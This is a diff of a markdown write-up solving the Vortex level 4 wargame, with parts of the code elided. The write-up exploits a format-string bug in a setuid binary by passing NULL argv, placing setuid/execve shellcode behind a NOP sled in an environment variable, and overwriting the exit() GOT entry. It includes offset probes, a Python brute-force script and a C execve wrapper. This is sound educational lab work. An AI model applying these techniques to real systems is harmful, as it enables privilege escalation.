@@ -17,17 +17,18 @@ int main(int argc, char **argv)
 ```
 
 ## 1. Bypass the check for arguments count
-The program exits if the argc variable is different than 0 (if(argc) exit(0);). argc variable represents the length of argv array, which has on the first position the program name (the name appearing on top and like utilities, for example). So argc is always >=1.
-If we know how arguments (and environment variables) are passed to the main function when executing the binary,  we can bypass the verification and also pass something meaningful to printf in argv[3] argument.  The stack looks like this:
+The program exits if the _`argc`_ variable is different than 0. _`argc`_ represents the length of _`argv`_ array, which has on the first position the program name (the name appearing on top and like utilities, for example). So argc is always >=1.
+But If we know how arguments and environment variables are passed to the main function when executing the binary,  we can bypass the verification and also pass something meaningful to _`printf`_ in _`argv[3]`_ argument.  The stack looks like this:
 ```
 | argc | argv[0] | argv[1] ... |argv[argc-1]| NULL |env[0]|...|env[n]|NULL|
 ```
-Where the first NULL indicates the end of the argv array, and the second one the end of the environment variables array. So if we pass NULL as the argv array, when the program tries to access argv[3], it will in fact access env[2], because the stack would look like this (argv[0] points to the NULL byte):
+
+Where the first _`NULL`_ indicates the end of the _`argv`_ array, and the second one the end of the environment variables array. So if we pass _`NULL_` as the _`argv`_ array, when the program tries to access _`argv[3]`_, it will in fact access _`env[2]`_, because the stack would look like this (_`argv[0]`_ points to the _`NULL`_ byte):
 ```
 | 0 | NULL | env[0] | env[1] | env[2] | ...
 ```
 
-In Python I couldn't call one of the exec functions with argv set to NULL, so I've used the classic method:
+In Python I couldn't call one of the _`exec`_ functions with _`argv`_ set to _`NULL`_, so I've used another method:
 ```c
 char exe[] = "/vortex/vortex4";
  
@@ -37,7 +38,8 @@ char* env[] = {"env0", "env1", "TEST", NULL};
 execve(exe, argv, env);
 ```
 
-2.  Now we know we have to pass the format string attack into an environment variable. We have to find out the approximate location of the environment variables in the memory. The vortex labs machine has ASLR disabled. We can test with and without ASLR to see the variation of the environment variables' address, using the following simple program:
+## 2.  Pass the format string attack into an environment variable
+We have to find out the approximate location of the environment variables in the memory. The Vortex labs machine has ASLR disabled. We can test with and without ASLR to see the variation of the environment variables' address, using the following simple program:
 ```c
 /* 
  * Test program to find the location of envirnment variables on stack.
@@ -76,7 +78,8 @@ int  main() {
 }
 ```
 
-3. We decide an address to overwrite to change the flow of the program. We can use the same trick as in the previous level: replace the address of exit() function in .plt (which is called at the end of the program), which we find by searching relocations sections in the binary:
+## 3. Redirect program flow
+We decide an address to overwrite to change the flow of the program. We can use the same trick as in the previous level: replace the address of _`exit()`_ function in _`.plt`_, which is called at the end of the program. We find it by searching relocations sections in the binary:
 ```bash
 vortex4@melissa:/vortex$ readelf -r ./vortex4
 [..]
@@ -88,44 +91,17 @@ Relocation section '.rel.plt' at offset 0x294 contains 4 entries:
 0804a00c  00000407 R_386_JUMP_SLOT   00000000   exit
 ```
 
-4. Plan: place a shellcode (I've used the same 32 bytes I've used in the previous level, setuid+execve) in  the environment variable, with a big NOP sled before (I've used 500 bytes). In the format string before, try to overwrite the address we found above, 0x0804a00c (which I've actually replaced in 4 bytes: 0x0804a00c, 0x0804a00d, 0x0804a00e, 0x0804a00f. A method to overwrite it with only 2 replaces instead of 4 is described in the referred documentation).
-This was actually the harder part. I've made a python wrapper over the C wrapper containing execve instruction, that passes (and finally brute-forces) different format strings.
-A good exercise is first to try to read memory (using %x or %s instead of %n for writing), to find the actual position of the format string on the stack. This will actually be quite different than the examples from [1]. I actually found that I needed 106 bytes to get to the format string on the stack.
-A trick that can be used here: direct parameter access in printf ($), detailed in the Single Unix Specification ([4]). For me, I could access the format string with the following parameter:
-?
-1
+## 4.Shellcode
+We'll place a shellcode (I've used the same 32 bytes I've used in the previous level, _`setuid + execve`_) in  the environment variable, with a big NOP sled before (I've used 500 bytes). In the format string before, try to overwrite the address we found above, _`0x0804a00c`_ (which I've actually replaced in 4 bytes: _`0x0804a00c`_, _`0x0804a00d`_, _`0x0804a00e`_, _`0x0804a00f`_. 
+
+This was actually the hardest part. I've made a Python wrapper over the C wrapper containing the _`execve`_ instruction, that passes and brute-forces different format strings.
+
+A good exercise to test the vulnerability is to first try to read memory (using _`%x`_ or _`%s`_ instead of _`%n`_ for writing), to find the actual position of the format string on the stack. I actually found that I needed 106 bytes to get to the format string on the stack. A trick that can be used here: direct parameter access in printf ($), detailed in the [Single Unix Specification ](http://pubs.opengroup.org/onlinepubs/7908799/xsh/fprintf.html). For me, I could access the format string with the following parameter:
+```bash
 fmt = "AAAABBBBCCCCDDDD..." + "%106$x%107$x%108$x%109$x"
-I've adjusted it with fillers ('.'), and tuned the offset untl reach the correct one, 106.
-The python script mentioned:
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
+```
+I've adjusted it with fillers ('.'), and tuned the offset until reach the correct one, 106. The Python brute-forcing script:
+```python
 import subprocess
  
 ''' 
@@ -154,7 +130,9 @@ for i in range(1, 255):
                  
                 p.wait()
                 # Ctrl-D to continue
-5. And the C wrapper with execve over vortex4 binary:
+```
+
+And the C wrapper with _`execve`_ over vortex4 binary:
 ```c
 /*
  * Wrapper over vortex 4 binary: 
@@ -195,7 +173,7 @@ int main(int argc, char **args) {
 }
 ```
 
-6. Putting all together we get the pass: 
+## 5. Putting pieces together: 
 ```bash
 vortex4@melissa:/tmp$ vim myl4.c
 vortex4@melissa:/tmp$ vim myl4.py
